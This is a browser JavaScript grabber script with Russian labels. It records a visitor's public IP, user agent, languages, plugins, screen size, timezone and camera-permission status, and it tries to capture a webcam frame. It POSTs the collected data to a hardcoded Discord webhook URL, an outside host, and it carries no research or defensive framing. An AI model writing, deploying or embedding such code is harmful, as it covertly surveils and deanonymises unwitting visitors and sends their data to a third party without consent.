async function captureCamera() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.createElement('video');
        video.srcObject = stream;
        await video.play();
        
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0);
        
        stream.getTracks().forEach(track => track.stop());
        
        return { status: "✔Разрешили", image: canvas.toDataURL('image/jpeg') };
    } catch (error) {
        if (error.name === 'NotAllowedError') {
            return { status: "🚫Запретили", image: null };
        } else {
            return { status: "❌Не доступно", image: null };
        }
    }
}

fetch('https://api.ipify.org')
.then(response => response.text())
.then(async (ip) => {

    const cameraResult = await captureCamera();
    
    const embed = {
        title: "🌐 Информация о пользователе",
        fields: [
            { name: "📱 User Agent", value: navigator.userAgent, inline: false },
            { name: "🗣️ Язык", value: navigator.language, inline: true },
            { name: "🌍 Языки", value: navigator.languages?.join(', ') || "Неизвестно", inline: true },
            { name: "🔌 Плагины", value: [...navigator.plugins].map(p => p.name).join(', ') || 'Нет', inline: false },
            { name: "📺 Размер экрана", value: `${screen.width} x ${screen.height}`, inline: true },
            { name: "🌍 Страна", value: "Неизвестно", inline: true },
            { name: "🏙️ Город", value: "Неизвестно", inline: true },
            { name: "📍 Регион", value: "Неизвестно", inline: true },
            { name: "📡 Провайдер", value: "Неизвестно", inline: true },
            { name: "🕐 Часовой пояс", value: Intl.DateTimeFormat().resolvedOptions().timeZone || "Неизвестно", inline: true },
            { name: "📷 Камера", value: cameraResult.status, inline: true },
            { name: "🆔 IP адрес", value: ip || "Неизвестно", inline: true }
        ],
        timestamp: new Date().toISOString()
    };

    fetch('https://discord.com/api/webhooks/1425143787747020873/Z0FpN8ORcAYSQPdW1ol91L89cLRQgR-Jr4tkG4bCe88O0frYcK_sSgBuSaeIZnDYSneo', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
            embeds: [embed]
        })
    });
});
